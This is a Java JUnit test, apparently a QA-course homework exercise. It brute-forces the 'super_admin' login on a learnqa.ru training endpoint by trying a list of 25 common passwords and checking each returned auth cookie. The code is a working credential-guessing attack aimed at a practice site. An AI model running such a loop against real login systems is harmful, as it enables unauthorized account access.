package tests;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class FindPasswordTest {

    @Test
    public void FindPasswordTestEx9() {

        ArrayList<String> passwords = new ArrayList<>();
        passwords.add("123456");
        passwords.add("123456789");
        passwords.add("qwerty");
        passwords.add("password");
        passwords.add("1234567");
        passwords.add("12345678");
        passwords.add("12345");
        passwords.add("iloveyou");
        passwords.add("111111");
        passwords.add("123123");
        passwords.add("abc123");
        passwords.add("qwerty123");
        passwords.add("1q2w3e4r");
        passwords.add("admin");
        passwords.add("qwertyuiop");
        passwords.add("654321");
        passwords.add("555555");
        passwords.add("lovely");
        passwords.add("7777777");
        passwords.add("welcome");
        passwords.add("888888");
        passwords.add("princess");
        passwords.add("dragon");
        passwords.add("password1");
        passwords.add("123qwe");


        for (String password : passwords) {
            Map<String, String> params = new HashMap<>();
            params.put("login", "super_admin");
            params.put("password", password);
            Response getSecretPass = RestAssured
                    .given()
                    .body(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String cookie = getSecretPass.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", cookie);

            Response checkCookie = RestAssured
                    .given()
                    .body(params)
                    .cookies(cookies)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            String answer = checkCookie.asString();

            if (!answer.equals("You are NOT authorized")) {
                System.out.println("Фраза: " + answer);
                System.out.println("Пароль: " + password);
            }
        }
    }

}
